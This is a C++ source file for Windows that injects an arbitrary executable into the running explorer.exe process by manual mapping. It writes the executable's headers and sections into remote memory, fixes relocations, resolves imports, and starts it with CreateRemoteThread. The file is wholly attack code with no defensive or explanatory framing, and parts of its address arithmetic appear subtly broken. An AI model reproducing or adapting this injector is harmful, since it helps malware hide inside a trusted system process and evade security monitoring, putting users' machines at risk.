
#pragma comment (linker,"/ENTRY:main")
#include <tchar.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <fstream>
#include <iostream>
using namespace std;
DWORD QyGetProcessID(TCHAR* msg)
{
  HANDLE hProcessSnap;
  PROCESSENTRY32 pe32;


  // Take a snapshot of all processes in the system.
  hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
  if( hProcessSnap == INVALID_HANDLE_VALUE )
  {
    _tprintf( TEXT("CreateToolhelp32Snapshot (of processes)") );
    return( FALSE );
  }

  // Set the size of the structure before using it.
  pe32.dwSize = sizeof( PROCESSENTRY32 );

  // Retrieve information about the first process,
  // and exit if unsuccessful
  if( !Process32First( hProcessSnap, &pe32 ) )
  {
    _tprintf( TEXT("Process32First") ); // show cause of failure
    CloseHandle( hProcessSnap );          // clean the snapshot object
    return( FALSE );
  }

  // Now walk the snapshot of processes, and
  // display information about each process in turn
  do
  {
	  /*
    _tprintf( TEXT("\n  Process ID        = 0x%08X"), pe32.th32ProcessID );
    _tprintf( TEXT("\n  Thread count      = %d"),   pe32.cntThreads );
    _tprintf( TEXT("\n  Parent process ID = 0x%08X"), pe32.th32ParentProcessID );
    _tprintf( TEXT("\n  Priority base     = %d"), pe32.pcPriClassBase );
    */
	if (!_tcscmp(pe32.szExeFile, msg)){
		_tprintf( TEXT("\n  get explorer.exe") );
		break;
	}

  } while( Process32Next( hProcessSnap, &pe32 ) );

 // CloseHandle( hProcessSnap );
  
  return pe32.th32ProcessID;
}
int main(int argc, _TCHAR* argv[])
{


	DWORD PID = QyGetProcessID(TEXT("explorer.exe"));
	
	//parse image file that we wanted to inject into explorer.exe
	PIMAGE_DOS_HEADER pDos;
	PIMAGE_NT_HEADERS pNT;
	PIMAGE_OPTIONAL_HEADER32 pOption;
	PIMAGE_SECTION_HEADER pSection;
	PIMAGE_FILE_HEADER pFileHeader;

	



	std::ifstream ifile (argv[1], std::ifstream::binary);

	std::filebuf* pbuf = ifile.rdbuf();
	std::size_t size = pbuf->pubseekoff (0,ifile.end,ifile.in);
	pbuf->pubseekpos (0,ifile.in);

	char* buf=new char[size]; 
	pbuf->sgetn (buf,size);

	ifile.close();
	pDos = (PIMAGE_DOS_HEADER) (buf);
	pNT = (PIMAGE_NT_HEADERS )(pDos->e_lfanew + (DWORD)buf);

	pOption = (PIMAGE_OPTIONAL_HEADER32 )( &pNT->OptionalHeader);
	pFileHeader = (PIMAGE_FILE_HEADER) &(pNT->FileHeader);
	pSection =( PIMAGE_SECTION_HEADER) ((DWORD)(pNT) + sizeof(IMAGE_NT_HEADERS) );


	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE, PID);		


	if( hProcess == NULL )
		_tprintf( TEXT("OpenProcess") );

	LPSTR mapAddress=(LPSTR)VirtualAllocEx(hProcess,0,pOption->SizeOfImage,MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(hProcess, mapAddress, buf, pOption->SizeOfHeaders,0);

	 
	for (int i = 0 ;i<pFileHeader->NumberOfSections;i++)
	{
		PIMAGE_SECTION_HEADER psh = pSection +i ;
		WriteProcessMemory(hProcess, (void *)((DWORD)mapAddress + psh->VirtualAddress ),(void *)((DWORD)(psh->PointerToRawData) + (DWORD)buf ), psh->SizeOfRawData ,0);
	}

	//relocation
	DWORD delta =   (DWORD)mapAddress - pOption->ImageBase;
	PIMAGE_BASE_RELOCATION curr=(PIMAGE_BASE_RELOCATION)GlobalAlloc(GPTR,sizeof(IMAGE_BASE_RELOCATION));
	PIMAGE_BASE_RELOCATION reloc =(PIMAGE_BASE_RELOCATION) (pOption->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + mapAddress);
	ReadProcessMemory(hProcess,(LPVOID)reloc,curr,sizeof(IMAGE_BASE_RELOCATION),0);

	DWORD relSize= pOption->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	int i =0;
	while (i < relSize)
	{
		
		int num = (curr->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION) )/sizeof(WORD) ;
		PWORD entry = (PWORD)((DWORD)reloc + sizeof(IMAGE_BASE_RELOCATION));

		for (int j = 0;j< num ;j++)
		{
			WORD offset ;
			ReadProcessMemory(hProcess,(LPVOID)entry,&offset,sizeof(WORD),0);

			if(offset >> 12 == IMAGE_REL_BASED_HIGHLOW)
			{
				PDWORD ADDR = (PDWORD) (curr->VirtualAddress+ offset& 0xfff + (DWORD) mapAddress );

				DWORD newValue;
				ReadProcessMemory(hProcess,ADDR,&newValue,4,0);
				newValue  = *ADDR + delta;
				WriteProcessMemory(hProcess, ADDR,&newValue,4,0 );
				
			}
			entry ++;
			
		}

		i+= curr->SizeOfBlock;
		reloc = (PIMAGE_BASE_RELOCATION)((DWORD)reloc + curr->SizeOfBlock); 
		ReadProcessMemory(hProcess,(LPVOID)reloc,curr,sizeof(IMAGE_BASE_RELOCATION),0);
	}

	GlobalFree(curr);

	PIMAGE_THUNK_DATA ITD;
	PIMAGE_THUNK_DATA PITD;
	PIMAGE_IMPORT_BY_NAME IIBN;

	if(pOption->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size>0)
	{
		PIMAGE_IMPORT_DESCRIPTOR IID = (PIMAGE_IMPORT_DESCRIPTOR) GlobalAlloc(GPTR,sizeof(IMAGE_IMPORT_DESCRIPTOR));
		PIMAGE_IMPORT_DESCRIPTOR PIID=(PIMAGE_IMPORT_DESCRIPTOR)(mapAddress+ pOption->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		
		ReadProcessMemory(hProcess,(LPVOID)PIID,IID,sizeof(IMAGE_IMPORT_DESCRIPTOR),0);
		for (;IID->Name;)
		{
			
			DWORD szName=0;
			CHAR miByte=1;
			for(int i=0;miByte;i++)
			{
				szName=i;
				ReadProcessMemory(hProcess,mapAddress+IID->Name+i,&miByte,1,0);
			}
			
			LPSTR lpName=(LPSTR)GlobalAlloc(GPTR,szName+1);
			ReadProcessMemory(hProcess,mapAddress+IID->Name,lpName,szName+1,0);
	
			HMODULE hLib=LoadLibraryA(lpName);
			PITD=(PIMAGE_THUNK_DATA)((DWORD)mapAddress+IID->FirstThunk);
			ITD=(PIMAGE_THUNK_DATA)GlobalAlloc(GPTR,sizeof(IMAGE_THUNK_DATA));
			ReadProcessMemory(hProcess,PITD,ITD,sizeof(IMAGE_THUNK_DATA),0);
	
			for (;ITD->u1.Ordinal;)
			{
				
				for(int i=0;miByte;i++)
				{
					szName=i;
					LPSTR puntero=mapAddress+ITD->u1.Function+2;
					puntero+=i;
					ReadProcessMemory(hProcess,puntero,&miByte,1,0);
				}

			
				IIBN=(PIMAGE_IMPORT_BY_NAME)GlobalAlloc(GPTR,sizeof(IMAGE_IMPORT_BY_NAME)+szName);
				ReadProcessMemory(hProcess,mapAddress+ITD->u1.Function,IIBN,sizeof(IMAGE_IMPORT_BY_NAME)+szName,0);

				DWORD lpAPI=(DWORD)GetProcAddress(hLib,(LPCSTR)&IIBN->Name);
				WriteProcessMemory(hProcess,mapAddress+IID->FirstThunk,&lpAPI,4,0);

				PITD++;
				ReadProcessMemory(hProcess,PITD,ITD,sizeof(IMAGE_THUNK_DATA),0);
			}
			PIID++;
			ReadProcessMemory(hProcess,(LPVOID)PIID,IID,sizeof(IMAGE_IMPORT_DESCRIPTOR),0);
			GlobalFree(lpName);
			GlobalFree(ITD);
		}
		GlobalFree(IID);
	}


	DWORD dwStart = (pOption->AddressOfEntryPoint) + (DWORD)mapAddress ;
	CreateRemoteThread(hProcess,0,0,(LPTHREAD_START_ROUTINE)dwStart,0,0,0);

	return 0;
}

